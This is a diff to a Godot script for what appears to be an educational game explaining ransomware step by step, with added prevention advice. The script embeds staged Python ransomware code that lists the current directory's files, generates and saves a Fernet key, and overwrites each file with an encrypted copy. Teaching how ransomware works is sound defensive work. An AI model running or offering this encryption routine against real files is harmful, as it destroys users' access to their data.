@@ -12,7 +12,7 @@ extends MarginContainer
 
 var step: int = 0
 var ransomware_code = {
-	"step_1" : "import os from cryptography.fernet\nimport fernet",
+	"step_1" : "import os\nfrom cryptography.fernet import fernet",
 	"step_2": "allfiles = []\nfor file in os.listdir():\n\tif file == 'malware.py' or file == 'key.key' or file == 'decr.py':\n\t\tcontinue\n\tif os.path.isfile(file):\n\t\tallfiles.append(file)\nprint(allfiles)\n\n",
 	"step_3": "key = Fernet.generate_key()\nwith open('key.key', 'wb') as thekey:\n\tthekey.write(key)\n\n",
 	"step_4": "for file in allfiles:\n\twith open(file, 'rb') as thefile:\n\t\tcontent = thefile.read()\n\tcontent_encryp = Fernet(key).encrypt(content)\n\twith open(file, 'wb') as thefile:\n\t\tthefile.write(content_encryp)\n\n",
@@ -25,7 +25,7 @@ func _ready() -> void:
 	back_button.disabled = true
 	code_edit.text = ""
 	overlay.visible = false 
-	rich_text_label.text = "⚠️ DANGER: RANSOMWARE ALERT ⚠️\n\nRansomware is one of the most dangerous types of malicious software. Once it infects your computer, it locks or encrypts your files so you cannot open them."
+	rich_text_label.text = "⚠️ DANGER: RANSOMWARE ALERT ⚠️\n\nRansomware is one of the most dangerous types of malicious software. Once it infects your computer, it locks or encrypts your files so you cannot open them. To protect yourself from ransomware, always back up your files, keep your system updated, use strong security tools, and be careful with emails and links, because prevention is much easier than fixing the damage."
 	
 
 func _on_back_button_down() -> void:
@@ -44,8 +44,6 @@ func _on_next_button_down() -> void:
 	set_step(step)
 
 func set_step(step: int) -> void:
-
-	
 	match step:
 		1:
 			overlay.visible = true
@@ -80,12 +78,12 @@ func set_step(step: int) -> void:
 			animation.play("encrypt_ransomware_step3")
 		9:	
 			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2 + ransomware_code.step_3
-			rich_text_label.text = "Step 3: Creating the Password Key\n\n- The program then saves this key into a file called key.key, using binary write mode (wb).\n\nSo at this stage, the program has created the “master key” and stored it safely in a separate file."
+			rich_text_label.text = "Step 3: Creating the Password Key - the most important part\n\n- The program then saves this key into a file called key.key, using binary write mode (wb).\n\nSo at this stage, the program has created the “master key” and stored it safely in a separate file."
 			animation.play("encrypt_ransomware_step3.2")
 					
 		10:
 			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2  + ransomware_code.step_3 + ransomware_code.step_4
-			rich_text_label.text = "Step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list."
+			rich_text_label.text = "Step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the \"allfiles[]\" list."
 			animation.play("encrypt_ransomware_step4")
 		11:	
 			rich_text_label.text = "Step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list.\n\n- Each file is opened in binary read mode (rb) so the raw data can be read."
